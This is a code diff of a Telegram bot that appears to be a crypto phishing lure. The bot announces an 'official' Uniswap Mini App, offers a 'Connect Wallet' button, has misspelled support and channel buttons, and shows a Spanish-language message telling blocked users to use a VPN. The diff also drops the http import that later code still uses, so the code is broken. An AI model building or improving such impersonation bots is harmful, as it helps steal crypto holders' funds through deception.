@@ -1,32 +1,46 @@
 const { Telegraf, Markup } = require("telegraf");
-const http = require("http");
+const axios = require('axios');
 const path = require("path");
 const { token, botApp, chanel, suportt, twitter } = require("./urls.json");
 
 const bot = new Telegraf(token);
 
-bot.start((ctx) => {
+bot.start(async (ctx) => {
   const imagePath = path.join(__dirname, "photo_2024-08-24_14-40-26.jpg");
-  ctx.replyWithPhoto(
-    { source: imagePath },
-    {
-      caption:
-        `👏 Minting a new beginning on [Telegram](https://t.me/durov). We announce the official launch of the Mini App version of UniSwap.org.\n\n` +
-        `💡 To open click on the following button.`,
-      parse_mode: "Markdown",
-      ...Markup.inlineKeyboard([
-        [Markup.button.url("🦄 Mini App", botApp)],
-        [
-          Markup.button.callback("Connect Wallet", "connect"),
-          Markup.button.url("Twitter", twitter),
-        ],
-        [
-          Markup.button.url("Chanel", chanel),
-          Markup.button.url("Suportt", suportt),
-        ],
-      ]),
+
+  try {
+    // Realiza la solicitud a la página web antes de mostrar la Mini App
+    const response = await axios.get(botApp);
+    if (response.status === 200) {
+      // Si la página es accesible, mostrar el mensaje habitual
+      ctx.replyWithPhoto(
+        { source: imagePath },
+        {
+          caption:
+            `👏 Minting a new beginning on [Telegram](https://t.me/durov). We announce the official launch of the Mini App version of UniSwap.org.\n\n` +
+            `💡 To open click on the following button.`,
+          parse_mode: "Markdown",
+          ...Markup.inlineKeyboard([
+            [Markup.button.url("🦄 Mini App", botApp)],
+            [
+              Markup.button.callback("Connect Wallet", "connect"),
+              Markup.button.url("Twitter", twitter),
+            ],
+            [
+              Markup.button.url("Chanel", chanel),
+              Markup.button.url("Suportt", suportt),
+            ],
+          ]),
+        }
+      );
     }
-  );
+  } catch (error) {
+    if (error.response && error.response.status === 403) {
+      ctx.reply("⚠️ La página web está bloqueada para tu ubicación. Por favor, utiliza un VPN para acceder.");
+    } else {
+      ctx.reply("Ocurrió un error al intentar acceder a la página web.");
+    }
+  }
 });
 
 bot.action("connect", (ctx) => {
@@ -34,6 +48,7 @@ bot.action("connect", (ctx) => {
 });
 
 bot.launch();
+
 
 const server = http.createServer((req, res) => {
   if (req.method === "GET" && req.url === "/status") {
